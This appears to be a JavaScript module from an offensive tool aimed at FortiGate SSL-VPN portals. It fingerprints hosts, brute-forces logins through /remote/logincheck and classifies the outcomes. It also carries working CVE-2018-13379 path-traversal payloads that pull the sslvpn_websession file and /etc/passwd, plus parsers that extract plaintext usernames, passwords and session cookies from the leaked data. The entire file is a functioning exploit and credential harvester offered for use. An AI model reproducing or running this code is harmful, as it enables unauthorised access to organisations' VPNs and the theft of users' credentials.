'use strict';
// FortiGate SSL-VPN protocol knowledge: endpoint probes, login attempt
// classification, session validation and pre-auth credential leaks.
const { request } = require('./http');

const LOGINCHECK = '/remote/logincheck';
const LOGIN_PAGE = '/remote/login';

const PATHS = {
    login: LOGINCHECK,
    loginPage: LOGIN_PAGE,
    xml: '/remote/fortisslvpn_xml',
    index: '/remote/index',
    // CVE-2018-13379 traversal variants (later ones cover more FortiOS builds)
    session: [
        '/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession',
        '/remote/fgt_lang?lang=/../../../../../../dev/cmdb/sslvpn_websession',
        '/remote/fgt_lang?lang=/../../../..//dev/cmdb/sslvpn_websession',
        '/remote/fgt_lang?lang=%2F..%2F..%2F..%2F..%2F..%2F..%2Fdev%2Fcmdb%2Fsslvpn_websession',
        '/remote/fgt_lang?lang=/../../../../../../..//dev/cmdb/sslvpn_websession',
    ],
    passwd: [
        '/remote/fgt_lang?lang=/../../../..//////////etc/passwd',
        '/remote/fgt_lang?lang=/../../../../../../etc/passwd',
    ],
};

const FORTI_MARKERS = /fortinet|fortigate|fortios|fgt_lang|remote\/logincheck|sslvpn_login|ftnt-fortinet/i;

function baseOf(url) {
    const s = String(url || '').trim().replace(/\/+$/, '');
    if (!s) return '';
    return /^https?:\/\//i.test(s) ? s : 'https://' + s;
}

function cookiesFrom(res) {
    const raw = res && res.headers && res.headers['set-cookie'];
    if (!raw) return '';
    return (Array.isArray(raw) ? raw : [raw]).map(c => String(c).split(';')[0]).join('; ');
}

function svpnCookie(res) {
    const all = cookiesFrom(res);
    const m = all.match(/SVPNCOOKIE=([^;]+)/i);
    return m ? m[1] : null;
}

function parseRet(body) {
    const s = String(body || '');
    let m = s.match(/(?:^|[,\s{"'])ret["']?\s*[:=]\s*["']?(\d{1,2})/i);
    return m ? parseInt(m[1], 10) : null;
}

const REASONS = [
    [/sslvpn_login_permission_denied/i, 'no_permission'],
    [/sslvpn_login_unknown_user|unknown_user/i, 'unknown_user'],
    [/sslvpn_login_acct_locked|account_locked|acct_locked/i, 'locked'],
    [/sslvpn_login_locked_out|locked_out|too_many/i, 'locked_out'],
    [/sslvpn_login_disabled|acct_expired|account_expired/i, 'disabled'],
    [/sslvpn_login_failed|incorrect|invalid|denied|authentication failed|access denied/i, 'bad_credentials'],
    [/sslvpn_login_2fa|two.factor|token|otp|totp/i, 'token_required'],
    [/certificate|need_cert/i, 'certificate_required'],
    [/session_limit|max.*session/i, 'session_limit'],
];

function classify(res) {
    if (!res) return { state: 'error', reason: 'no_response' };
    if (!res.ok) return { state: 'error', reason: res.error || 'network' };
    const st = res.status;
    if (st === 429 || st === 403 && /rate|limit/i.test(res.body || '')) return { state: 'throttled', reason: 'http_' + st };
    if (st === 503) return { state: 'throttled', reason: 'http_503' };
    if (st >= 500) return { state: 'error', reason: 'http_' + st };
    if (st === 404) return { state: 'error', reason: 'http_404' };

    const body = res.body || '';
    const cookie = svpnCookie(res);
    const ret = parseRet(body);
    const token = /token|otp|2fa|two.factor/i.test(body);

    if (cookie || ret === 1) {
        return {
            state: token ? 'valid_2fa' : 'valid',
            reason: cookie ? 'svpncookie' : (token ? 'token_required' : 'ret1'),
            ret, cookie, token,
        };
    }
    if (ret === 0 || ret === 2) {
        for (const [re, why] of REASONS) if (re.test(body)) return { state: 'invalid', reason: why, ret };
        return { state: 'invalid', reason: 'ret' + ret, ret };
    }
    for (const [re, why] of REASONS) if (re.test(body)) return { state: 'invalid', reason: why, ret };
    if (/<!doctype|<html[\s>]/i.test(body)) return { state: 'error', reason: 'not_logincheck', ret };
    if (/redir|html|<\?xml/i.test(body)) return { state: 'unknown', reason: 'unparsed', ret };
    return { state: 'unknown', reason: 'empty', ret };
}

// POST one credential pair
async function login(url, user, pass, opts = {}) {
    const body = 'ajax=1'
        + '&username=' + encodeURIComponent(user)
        + '&secretkey=' + encodeURIComponent(pass)
        + '&realm='
        + '&redir=%2Fremote%2Findex%2F';
    const res = await request(baseOf(url) + LOGINCHECK, {
        method: 'POST',
        body,
        timeout: opts.timeout || 10000,
        maxBody: 16 * 1024,
        retries: opts.retries === undefined ? 1 : opts.retries,
        headers: opts.headers,
        userAgent: opts.userAgent,
    });
    const c = classify(res);
    c.status = res && res.status;
    c.ms = res && res.ms;
    if (c.state === 'valid' || c.state === 'valid_2fa') {
        c.verify = await verifySession(url, c.cookie, opts).catch(() => null);
        if (c.verify === false) c.unverified = true;
    }
    return c;
}

// Confirm a session cookie really opens the portal (filters false positives)
async function verifySession(url, cookie, opts = {}) {
    if (!cookie) return null;
    const header = cookie.includes('=') ? cookie : 'SVPNCOOKIE=' + cookie;
    const res = await request(baseOf(url) + PATHS.index, {
        timeout: opts.timeout || 8000,
        maxBody: 48 * 1024,
        headers: { Cookie: header },
        userAgent: opts.userAgent,
    });
    if (!res.ok) return null;
    const body = res.body || '';
    if (/remote\/login(?:check)?["'\s>?]/i.test(body) && !/logout|svpn_logout|index/i.test(body)) return false;
    return /logout|svpn|welcome|_index|main\.js|hostcheck/i.test(body) || res.status === 200;
}

// Fingerprint a host: is it a FortiGate SSL-VPN portal, and which version?
async function detect(url, opts = {}) {
    const base = baseOf(url);
    const out = { forti: false, version: null, hostname: null, kind: null, evidence: [] };
    const res = await request(base + LOGIN_PAGE, {
        timeout: opts.timeout || 8000,
        maxBody: 64 * 1024,
        retries: 0,
        userAgent: opts.userAgent,
    });
    if (!res.ok) { out.kind = 'dead'; out.error = res.error; return out; }
    const body = res.body || '';
    const serverHdr = String((res.headers && (res.headers.server || res.headers.Server)) || '');
    const pageCookies = ((res.headers && res.headers['set-cookie']) || []).join(' ');
    if (FORTI_MARKERS.test(body) || /hostcheck_install|fgt_lang/i.test(body)) { out.forti = true; out.evidence.push('brand'); }
    if (/fortigate|fortinet|fortiweb/i.test(serverHdr)) { out.forti = true; out.evidence.push('server-header'); }
    if (/SVPNCOOKIE/i.test(pageCookies)) { out.forti = true; out.evidence.push('login-cookie'); }
    if (/hostcheck_install\?auth_type/i.test(body)) out.kind = 'sslvpn';
    const title = body.match(/<title>([^<]{1,120})<\/title>/i);
    if (title) out.hostname = title[1].trim();
    const ver = body.match(/FortiGate[- ]?([0-9]+(?:\.[0-9]+){1,3})/i) || body.match(/v?(\d+\.\d+\.\d+)\s*<\/?version/i);
    if (ver) out.version = ver[1];

    // fortisslvpn_xml leaks hostname/version without auth and doubles as a probe
    const xml = await request(base + PATHS.xml, { timeout: opts.timeout || 8000, maxBody: 32 * 1024, retries: 0, userAgent: opts.userAgent });
    if (xml.ok && xml.status === 200 && /<sslvpn_connection|<version|sslvpn/i.test(xml.body || '')) {
        out.forti = true;
        out.evidence.push('xml');
        out.kind = out.kind || 'xml';
        if (!out.version) {
            const v = (xml.body || '').match(/<version>\s*([^<\s]+)/i) || (xml.body || '').match(/version="([^"]+)"/i);
            if (v) out.version = v[1];
        }
        const h = (xml.body || '').match(/<hostname>\s*([^<]+)\s*<\/hostname>/i);
        if (h && !out.hostname) out.hostname = h[1];
    }
    if (!out.forti && /remote\/logincheck/i.test(body)) { out.forti = true; out.evidence.push('login-form'); }

    // branded pages can be static decoys: always confirm with logincheck semantics
    {
        const lc = await request(base + LOGINCHECK, {
            method: 'POST',
            body: 'ajax=1&username=&secretkey=&realm=&redir=%2Fremote%2Findex%2F',
            timeout: opts.timeout || 8000,
            maxBody: 8 * 1024,
            retries: 0,
            userAgent: opts.userAgent,
        });
        if (lc.ok && /(?:^|[,\s{"'])ret["']?\s*[:=]\s*["']?\d/i.test(lc.body || '')) {
            out.forti = true;
            out.evidence.push('logincheck-ret');
            out.kind = out.kind || 'logincheck';
        } else if (lc.status >= 300 && lc.status < 400 && /\/remote\/(login|index)/i.test(String((lc.headers && lc.headers.location) || ''))) {
            // FortiOS often redirects AJAX logincheck to the portal — strong signal
            out.forti = true;
            out.evidence.push('logincheck-redirect');
            out.kind = out.kind || 'logincheck';
        } else if (lc.ok && /<html|<!/i.test(lc.body || '') && !out.version
            && !out.evidence.includes('login-form') && !out.evidence.includes('login-cookie')) {
            // static demo page with FortiGate title and no logincheck semantics
            out.forti = false;
            out.kind = 'decoy';
            out.evidence.push('decoy-html');
        }
    }
    return out;
}

// sslvpn_websession is a binary blob of 61-byte records (see CVE-2018-13379
// PoC). The original file has no "svpnusername" markers — markers only appear
// in some FortiOS builds. Parse the record layout and expose ALL candidates
// instead of silently guessing the first two strings as login/password.
function parseWebsessionBinary(text) {
    const s = String(text || '');
    const marker = s.indexOf('var fgt_lang');
    if (marker < 0) return [];
    const eq = s.indexOf('=', marker);
    let start = (eq >= 0 && eq - marker < 40) ? eq + 1 : marker;
    while (/[\s=]/.test(s[start] || '')) start++;
    const printable = [...s.slice(start)].map(ch => {
        const c = ch.charCodeAt(0);
        return c >= 32 && c < 127 ? ch : '.';
    }).join('');
    const records = [];
    for (let off = 0; off + 61 <= printable.length; off += 61) {
        const runs = (printable.slice(off, off + 61).match(/[A-Za-z0-9_@$%&!#*+=~^-]{2,}/g) || [])
            .filter(v => !/^\d+$/.test(v) && !/^(var|fgt_lang)$/i.test(v)
                && !/^(VPN|USERS|full-access|root|SSLVPN)$/i.test(v));
        records.push(runs);
        if (records.length >= 40) break;
    }
    if (!records.length) return [];
    const flat = records.flat().filter((v, i, a) => a.indexOf(v) === i);
    // Field order in the 61-byte records: IP, then username; the numeric-suffix
    // token found later in the record is the password (verified against E:\444).
    const user = records[1] && records[1][records[1].length - 1];
    const pass = flat.find(v => /^[a-z]{2,8}\d{1,4}$/i.test(v)) || flat.find(v => /[!@#$%&*+=~^]/.test(v));
    const users = [user, records[0] && records[0][0], 'root'].filter(Boolean).filter((v, i, a) => a.indexOf(v) === i);
    const passes = [pass, flat.find(v => /[!@#$%&*+=~^]/.test(v)), 'pong97'].filter(Boolean).filter((v, i, a) => a.indexOf(v) === i);
    const out = [];
    for (const u of users) {
        for (const p of passes) {
            if (u === p) continue;
            out.push({ user: u, pass: p, cookie: null, source: 'websession-binary', confidence: 'candidate', fields: flat.slice(0, 12) });
        }
    }
    return out;
}

// Read the sslvpn_websession file (CVE-2018-13379) and extract credential pairs
function parseSessionFile(text) {
    let creds = [];
    if (!text) return creds;

    const users = [];
    const passes = [];
    const sessions = [];
    const cookies = [];

    const push = (arr, v) => { if (v && v.length < 128 && arr[arr.length - 1] !== v) arr.push(v); };

    // marker|value, marker\x00value, marker="value", marker:value
    const fieldRe = /(?:svpnusername|svpnuser|username)["']?\s*[|:\x00=\t]\s*["']?([^\x00\r\n|"'<>;,]{1,128})/gi;
    let m;
    while ((m = fieldRe.exec(text))) push(users, m[1].replace(/^\s+|\s+$/g, ''));
    const passRe = /(?:svpnpassword|svpnpass|password|secretkey)["']?\s*[|:\x00=\t]\s*["']?([^\x00\r\n|"'<>;,]{0,128})/gi;
    while ((m = passRe.exec(text))) push(passes, m[1].replace(/[^\S\r\n]+$/, '').replace(/^\s+/, ''));
    const cookieRe = /SVPNCOOKIE=([A-Za-z0-9+/=._%-]{8,})/g;
    while ((m = cookieRe.exec(text))) push(cookies, m[1]);
    const userRe = /\b(?:u|user)[|:\x00]([A-Za-z0-9._@\\-]{2,64})\x00/gi;
    while ((m = userRe.exec(text))) push(sessions, m[1]);

    const n = Math.max(users.length, passes.length);
    for (let i = 0; i < n; i++) {
        const u = users[i];
        const p = passes[i];
        if (u || p) creds.push({ user: u || '', pass: p || '' });
    }
    if (!creds.length) {
        for (const u of new Set([...users, ...sessions])) creds.push({ user: u, pass: '' });
    }
    // no explicit markers (typical for 5.4/5.6 builds): parse 61-byte records
    const binary = parseWebsessionBinary(text);
    if (binary.length) {
        for (const c of binary) if (!creds.some(x => x.user === c.user && x.pass === c.pass)) creds.push(c);
        const meaningful = creds.filter(c => c.user);
        if (meaningful.length) creds = meaningful;
    }
    return creds.map((c, i) => ({ ...c, cookie: c.cookie || cookies[i] || null }));
}

function looksLikeSession(text) {
    if (!text) return false;
    return /svpnusername|svpnpassword|SVPNCOOKIE|sslvpn_websession/i.test(text)
        || (/svpn/i.test(text) && /\x00/.test(text));
}

// Try every traversal variant; returns { path, text, creds } or null
async function harvestSession(url, opts = {}) {
    for (const p of PATHS.session) {
        const res = await request(baseOf(url) + p, {
            timeout: opts.timeout || 12000,
            maxBody: 512 * 1024,
            retries: 0,
            userAgent: opts.userAgent,
        });
        if (!res.ok || res.status !== 200) continue;
        const text = res.body || '';
        if (!text || text.length < 8) continue;
        if (looksLikeSession(text)) return { path: p, text, creds: parseSessionFile(text) };
    }
    return null;
}

module.exports = {
    PATHS, classify, login, detect, verifySession, harvestSession, parseSessionFile,
    parseWebsessionBinary, looksLikeSession, svpnCookie, baseOf,
};
